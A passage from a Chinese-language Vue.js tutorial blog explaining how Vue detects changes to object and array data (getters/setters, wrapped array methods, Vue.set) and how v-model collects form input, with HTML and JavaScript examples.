2 升序</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">persons</span>: [</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;001&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">age</span>: <span class="number">30</span>, <span class="attr">sex</span>: <span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;002&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;张四&#x27;</span>, <span class="attr">age</span>: <span class="number">34</span>, <span class="attr">sex</span>: <span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;003&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;王四&#x27;</span>, <span class="attr">age</span>: <span class="number">19</span>, <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;004&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;王五&#x27;</span>, <span class="attr">age</span>: <span class="number">20</span>, <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">            ],</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">filPersons</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> arr = <span class="variable language_">this</span>.<span class="property">persons</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> item.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="variable language_">this</span>.<span class="property">name</span>) !== -<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">                &#125;)</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">sortType</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    arr.<span class="title function_">sort</span>(<span class="function">(<span class="params">item1, item2</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">sortType</span> === <span class="number">1</span> ? item2.<span class="property">age</span> - item1.<span class="property">age</span> : item1.<span class="property">age</span> - item2.<span class="property">age</span></span></span><br><span class="line"><span class="language-javascript">                    &#125;)</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> arr</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="1-15-vue监测数据改变的原理"><a href="#1-15-vue监测数据改变的原理" class="headerlink" title="1.15.vue监测数据改变的原理"></a>1.15.<code>vue</code>监测数据改变的原理</h2><h3 id="1-15-1-数据更新时的问题"><a href="#1-15-1-数据更新时的问题" class="headerlink" title="1.15.1.数据更新时的问题"></a>1.15.1.数据更新时的问题</h3><ul>
<li><p>当数组中的对象作为一个整体被更新时，内存中的数据是改了，但是页面上并没有改，因为<code>vue</code>没有监测到</p>
</li>
<li><p>更改的写法：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>列表过滤<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;update&quot;</span>&gt;</span>更改信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) of persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span>&#123;&#123;item.name&#125;&#125; - &#123;&#123;item.age&#125;&#125; - &#123;&#123;item.sex&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">persons</span>: [</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;001&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">age</span>: <span class="number">30</span>, <span class="attr">sex</span>: <span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;002&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;张四&#x27;</span>, <span class="attr">age</span>: <span class="number">34</span>, <span class="attr">sex</span>: <span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;003&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;王四&#x27;</span>, <span class="attr">age</span>: <span class="number">19</span>, <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;004&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;王五&#x27;</span>, <span class="attr">age</span>: <span class="number">20</span>, <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">            ],</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">update</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">persons</span>[<span class="number">0</span>].<span class="property">name</span> = <span class="string">&#x27;赵六&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">persons</span>[<span class="number">0</span>].<span class="property">age</span> = <span class="string">&#x27;18&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">persons</span>[<span class="number">0</span>].<span class="property">sex</span> = <span class="string">&#x27;男&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>无法更改的写法（直接用一整个对象去赋值）</p>
<p>内存中的数据实际改了，但<code>vue</code>没有监测到，所以页面就没有变化</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">    update() &#123;</span><br><span class="line">        this.persons[0] = &#123;name: &#x27;赵六&#x27;, age: 18, sex: &#x27;男&#x27;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220521110400917.png" alt="image-20220521110400917"></p>
</li>
</ul>
<h3 id="1-15-2-Vue监测对象数据改变的原理"><a href="#1-15-2-Vue监测对象数据改变的原理" class="headerlink" title="1.15.2.Vue监测对象数据改变的原理"></a>1.15.2.<code>Vue</code>监测对象数据改变的原理</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>姓名：&#123;&#123;person.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;person.age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">person</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">age</span>: <span class="number">18</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>我们之前讲写<code>data</code>配置项后，通过数据代理，<code>vm</code>实例上的<code>_data</code>就代理了配置项<code>data</code></p>
<p>但这个已经是第二步了</p>
<p><code>vue</code>拿到配置项<code>data</code>的第一步，是先加工一下<code>data</code>：给<code>data</code>里的每一组键值，都设置了<code>getter/setter</code>函数</p>
<p>然后把加工后的<code>data</code>给了<code>_data</code></p>
<p>那么为什么要加工呢？加工后就可以做响应式了（数据变了，页面也跟着变）</p>
<p>当后面修改<code>_data</code>里面的内容的时候，就会引起<code>name</code>所对应的<code>setter</code>调用，即<code>reactiveSetter</code>响应式<code>setter</code>，这个响应式<code>setter</code>里面肯定会调用一些方法：能够引起模板的重新解析，引起后续动作</p>
<p>打印输出一下<code>_data</code>：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220521111524338.png" alt="image-20220521111524338"></p>
<p>自己实现：</p>
<ul>
<li><p>更改数据后，会有人提示我，更改了</p>
<ul>
<li>创建一个监视的实例对象，用于监视<code>data</code>中属性的变化</li>
<li>汇总对象中所有的属性，形成一个数组</li>
<li>遍历每一个<code>key</code>，在监视的实力对象上，为每个<code>key</code>添加<code>getter/setter</code>（数据代理）</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">let</span> data = &#123;</span><br><span class="line">       <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span><br><span class="line">       <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">Observer</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">       <span class="comment">// 汇总对象中所有的属性，形成一个数组</span></span><br><span class="line">       <span class="keyword">const</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(obj)</span><br><span class="line">       <span class="comment">//遍历添加`getter/setter`</span></span><br><span class="line">       keys.<span class="title function_">forEach</span>(<span class="function"><span class="params">k</span> =&gt;</span> &#123;</span><br><span class="line">           <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">this</span>, k, &#123;</span><br><span class="line">               <span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">                   <span class="keyword">return</span> obj[k]</span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="title function_">set</span>(<span class="params">val</span>) &#123;</span><br><span class="line">                   obj[k] = val</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;)</span><br><span class="line">       &#125;)</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// 创建一个监视的实例对象，用于监视`data`中属性的变化</span></span><br><span class="line">   <span class="keyword">const</span> obs = <span class="keyword">new</span> <span class="title class_">Observer</span>(data)</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(obs)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>准备一个<code>vm</code>对象，将<code>obs</code>赋值给该对象的<code>_data</code>属性</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="keyword">let</span> data = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Observer</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(obj)</span><br><span class="line">    keys.<span class="title function_">forEach</span>(<span class="function"><span class="params">k</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">this</span>, k, &#123;</span><br><span class="line">            <span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> obj[k]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">set</span>(<span class="params">val</span>) &#123;</span><br><span class="line">                obj[k] = val</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;k&#125;</span>被修改了，接下来去解析模板，生成虚拟dom`</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> obs = <span class="keyword">new</span> <span class="title class_">Observer</span>(data)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obs)</span><br><span class="line"><span class="keyword">const</span> vm = &#123;&#125;</span><br><span class="line">vm.<span class="property">_data</span> = data = obs</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220522112843100.png" alt="image-20220522112843100"></p>
</li>
<li><p>我们要修改属性，必须通过<code>_data</code>来修改，<code>vue</code>可以直接修改，这是比我们完善的地方；并且我们没有考虑，对象里面嵌套对象、数据是数组的情况</p>
</li>
</ul>
</li>
</ul>
<h3 id="1-15-3-Vue-set-方法"><a href="#1-15-3-Vue-set-方法" class="headerlink" title="1.15.3.Vue.set()方法"></a>1.15.3.<code>Vue.set()</code>方法</h3><p>后添加的数据，也能实现响应式：</p>
<ul>
<li><code>Vue.set(vm._data.student, &#39;sex&#39;, &#39;男&#39;)</code></li>
<li><code>vm.$set(vm._data.student, &#39;sex&#39;, &#39;男&#39;)</code></li>
</ul>
<p>在<code>Vue</code>中，<code>vm._data.student === vm.student</code></p>
<ul>
<li><code>Vue.set(vm.student, &#39;sex&#39;, &#39;男&#39;)</code></li>
<li><code>vm.$set(vm.student, &#39;sex&#39;, &#39;男&#39;)</code></li>
</ul>
<p>局限：不能给<code>Vue</code>实例的<code>data</code>追加属性，只能给<code>data</code>里面的某一个对象追加属性</p>
<p>即<code>vm.$set(vm._data, &#39;sex&#39;, &#39;男&#39;)</code>是错误的：</p>
<h3 id="1-15-4-Vue检测数组数据改变的原理"><a href="#1-15-4-Vue检测数组数据改变的原理" class="headerlink" title="1.15.4.Vue检测数组数据改变的原理"></a>1.15.4.<code>Vue</code>检测数组数据改变的原理</h3><p>对于数组类型的数据，是没有为<code>索引</code>服务的<code>setter/getter</code>的，所以通过索引值修改数组对象，<code>Vue</code>是不能实现响应式的</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220522121829731.png" alt="image-20220522121829731"></p>
<p>修改数据后，页面并没有重新解析，因为<code>vue</code>没有监视到</p>
<p>那么用户修改数组数据时，怎么知道修改了呢？</p>
<ul>
<li><p>退一步思考，修改数据的方法有哪些呢？</p>
<ul>
<li><code>push</code>、<code>pop</code>、<code>shift</code>、<code>unshift</code>、<code>splice</code>、<code>sort</code>、<code>reverse</code></li>
</ul>
</li>
<li><p><code>vue</code>重写了上述方法，在修改数组调用上述方法时，就可以监测到数组改变了</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220522132359746.png" alt="image-20220522132359746"></p>
</li>
</ul>
<p>那么<code>vue</code>是怎么监测的到，用户调用了<code>push</code>方法呢？</p>
<p>用户调用的<code>push</code>已经不是原生的<code>push</code>方法了，是经过<code>vue</code>包装过的了</p>
<ul>
<li><p>正常数组的的<code>push</code>是<code>Array</code>原型对象上的<code>push</code>：<code>arr.push === Arrar.prototype.push</code></p>
</li>
<li><p><code>vue</code>中管理的数组上的<code>push</code>不是原生的<code>push</code>，还做了其他的事情</p>
<ul>
<li>先调用原生的<code>push</code></li>
<li>再重新渲染模板，生成虚拟<code>dom</code></li>
</ul>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220522133102245.png" alt="image-20220522133102245"></p>
</li>
</ul>
<p><code>Vue</code>通过包装数组身上的常用修改数组的方法，实现数组的监测</p>
<p>对于数组数据，也可以通过<code>Vue.set()</code>或<code>vm.$set()</code>来设置响应式</p>
<h3 id="1-15-5-小结：Vue监视数据"><a href="#1-15-5-小结：Vue监视数据" class="headerlink" title="1.15.5.小结：Vue监视数据"></a>1.15.5.小结：<code>Vue</code>监视数据</h3><ul>
<li><code>vue</code>会监视<code>data</code>中所有层次的数据</li>
<li>如何监视对象中的数据<ul>
<li>通过<code>getter</code>实现监视，并且要在<code>new Vue</code>时就传入要监视的数据<ul>
<li>对象中后追加的属性，<code>vue</code>默认不做响应式处理</li>
<li>如需给后添加的属性做响应式，请使用如下<code>api</code>:<ul>
<li><code>Vue.set(target, propertyName/index, value)</code>或</li>
<li><code>vm.$set(target, propertyName/index, value)</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>如何监测数组中的数据<ul>
<li>通过包裹数组更新元素的方法实现，本质就是做了两件事<ul>
<li>调用原生对应的方法对数组进行更新</li>
<li>重新解析模板，进而更新页面</li>
</ul>
</li>
</ul>
</li>
<li>在<code>vue</code>中修改数组的某个元素，一定要用如下方法：<ul>
<li>使用这些<code>API</code>：<code>push()</code>、<code>pop()</code>、<code>shift()</code>、<code>unshift()</code>、<code>splice()</code>、<code>sort()</code>、<code>reverse()</code></li>
<li><code>Vue.set()</code>或<code>$vm.$set()</code><ul>
<li>特别注意：不能给<code>vm</code>或<code>vm</code>的根数据对象添加属性</li>
</ul>
</li>
</ul>
</li>
<li>数据劫持<ul>
<li>把传入的<code>data</code>都遍历一遍变成<code>getter/setter</code>形式的这种操作，叫做<code>数据劫持</code></li>
</ul>
</li>
</ul>
<h2 id="1-16-收集表单数据"><a href="#1-16-收集表单数据" class="headerlink" title="1.16.收集表单数据"></a>1.16.收集表单数据</h2><h3 id="1-16-1-不同类型的输入框"><a href="#1-16-1-不同类型的输入框" class="headerlink" title="1.16.1.不同类型的输入框"></a>1.16.1.不同类型的输入框</h3><p><code>v-mode</code>配合不同<code>input</code>时，会有不同的技巧</p>
<ul>
<li><p>最基础的输入框:输入的值，就是<code>value</code>值</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;account&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>单选框：要配置<code>value</code>，并且要有一个<code>String</code>类型的变量，存储选中的<code>value</code>值</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">      性别：</span><br><span class="line">      男 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span>&gt;</span> </span><br><span class="line">女 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>复选框：要配置<code>value</code>，并且要有一个<code>Array</code>类型的变量，存储选中的<code>value</code>值；如果不配置<code>value</code>，该变量存储的是<code>checked</code>的布尔状态</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爱好：</span><br><span class="line">学习 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;study&quot;</span>&gt;</span></span><br><span class="line">吃饭 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;eating&quot;</span>&gt;</span></span><br><span class="line">打游戏 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;game&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>选择框：内层多个<code>option</code>要配置<code>value</code>，并且最外层要有一个<code>String</code>类型的变量，存储选中的<code>value</code>值</p>
